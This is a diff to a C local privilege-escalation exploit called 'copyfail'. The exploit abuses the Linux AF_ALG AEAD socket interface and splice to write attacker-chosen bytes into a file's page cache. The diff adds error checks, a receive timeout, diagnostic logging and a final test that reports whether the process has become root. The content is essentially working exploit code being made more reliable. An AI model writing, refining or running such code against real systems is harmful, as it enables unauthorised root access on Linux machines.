@@ -24,7 +24,9 @@
 #include <string.h>
 #include <sys/socket.h>
 #include <sys/stat.h>
+#include <sys/time.h>
 #include <sys/types.h>
+#include <pwd.h>
 #include <sys/utsname.h>
 #include <unistd.h>
 
@@ -120,11 +122,21 @@ static int page_cache_write(int target_fd, size_t off, const uint8_t data[4])
         err("bind(AF_ALG): %s – is CONFIG_CRYPTO_USER_API_AEAD=y?", strerror(errno));
         close(alg_fd); return -1;
     }
-    setsockopt(alg_fd, SOL_ALG, ALG_SET_KEY, AEAD_KEY, sizeof(AEAD_KEY));
-    setsockopt(alg_fd, SOL_ALG, ALG_SET_AEAD_AUTHSIZE, NULL, AEAD_AUTHSIZE);
+    if (setsockopt(alg_fd, SOL_ALG, ALG_SET_KEY, AEAD_KEY, sizeof(AEAD_KEY)) < 0) {
+        err("setkey: %s", strerror(errno)); close(alg_fd); return -1;
+    }
+    if (setsockopt(alg_fd, SOL_ALG, ALG_SET_AEAD_AUTHSIZE, NULL, AEAD_AUTHSIZE) < 0) {
+        err("setauthsize(%d): %s", AEAD_AUTHSIZE, strerror(errno)); close(alg_fd); return -1;
+    }
 
     int req_fd = accept(alg_fd, NULL, NULL);
-    if (req_fd < 0) { close(alg_fd); return -1; }
+    if (req_fd < 0) {
+        err("accept(AF_ALG): %s", strerror(errno)); close(alg_fd); return -1;
+    }
+
+    /* 5-second timeout: recv() must not hang if the kernel stalls */
+    struct timeval tv = { .tv_sec = 5, .tv_usec = 0 };
+    setsockopt(req_fd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
 
     /* 2. sendmsg: AAD (8 zero bytes) + payload as "ciphertext" (4 bytes = ESN) */
     uint8_t iov_buf[AEAD_ASSOCLEN + AEAD_AUTHSIZE];
@@ -141,7 +153,10 @@ static int page_cache_write(int target_fd, size_t off, const uint8_t data[4])
         .msg_control    = ctrl_buf,
         .msg_controllen = CTRL_SZ,
     };
-    sendmsg(req_fd, &msg, MSG_MORE);
+    if (sendmsg(req_fd, &msg, MSG_MORE) < 0) {
+        err("sendmsg: %s", strerror(errno));
+        close(req_fd); close(alg_fd); return -1;
+    }
 
     /* 3. splice: target file → pipe → AEAD req */
     int pfd[2];
@@ -149,12 +164,29 @@ static int page_cache_write(int target_fd, size_t off, const uint8_t data[4])
 
     size_t splice_len = off + AEAD_AUTHSIZE;
     loff_t src_off = 0;
-    splice(target_fd, &src_off, pfd[1], NULL, splice_len, 0);
-    splice(pfd[0],    NULL,     req_fd, NULL, splice_len, 0);
+    ssize_t s1 = splice(target_fd, &src_off, pfd[1], NULL, splice_len, 0);
+    if (s1 < 0) {
+        err("splice(file→pipe): %s  splice_len=%zu", strerror(errno), splice_len);
+        close(pfd[0]); close(pfd[1]); close(req_fd); close(alg_fd); return -1;
+    }
+    ssize_t s2 = splice(pfd[0], NULL, req_fd, NULL, (size_t)s1, 0);
+    if (s2 < 0) {
+        err("splice(pipe→alg): %s", strerror(errno));
+        close(pfd[0]); close(pfd[1]); close(req_fd); close(alg_fd); return -1;
+    }
+    info("    splice: %zd → %zd bytes sent to AEAD", s1, s2);
 
     /* 4. recv: triggers decryption; authencesn ESN write fires here */
     uint8_t rbuf[AEAD_ASSOCLEN + 256];
-    recv(req_fd, rbuf, sizeof(rbuf), 0);  /* EBADMSG expected – ignore */
+    ssize_t n = recv(req_fd, rbuf, sizeof(rbuf), 0);
+    if (n < 0) {
+        if (errno == EAGAIN || errno == EWOULDBLOCK)
+            err("recv timed out (5 s) – kernel stalled; check algorithm availability");
+        else if (errno != EBADMSG)
+            err("recv: %s (errno=%d)", strerror(errno), errno);
+        /* EBADMSG = auth-tag mismatch, expected; the ESN write may have already fired */
+    }
+    info("    recv: n=%zd  errno=%d (%s)", n, errno, strerror(errno));
 
     close(pfd[0]); close(pfd[1]);
     close(req_fd); close(alg_fd);
@@ -220,7 +252,18 @@ static void exploit(void)
 
 int main(void)
 {
-    info("copyfail  pid=%d uid=%d", getpid(), getuid());
+    uid_t uid = getuid();
+    struct passwd *pw = getpwuid(uid);
+    info("copyfail  pid=%d  user=%s  uid=%d",
+         getpid(), pw ? pw->pw_name : "?", uid);
+
     exploit();
+
+    uid_t uid_after = getuid();
+    if (uid_after == 0)
+        ok("uid: %d → 0  (root!)", uid);
+    else
+        info("uid after: %d (no escalation in this demo)", uid_after);
+
     return 0;
 }
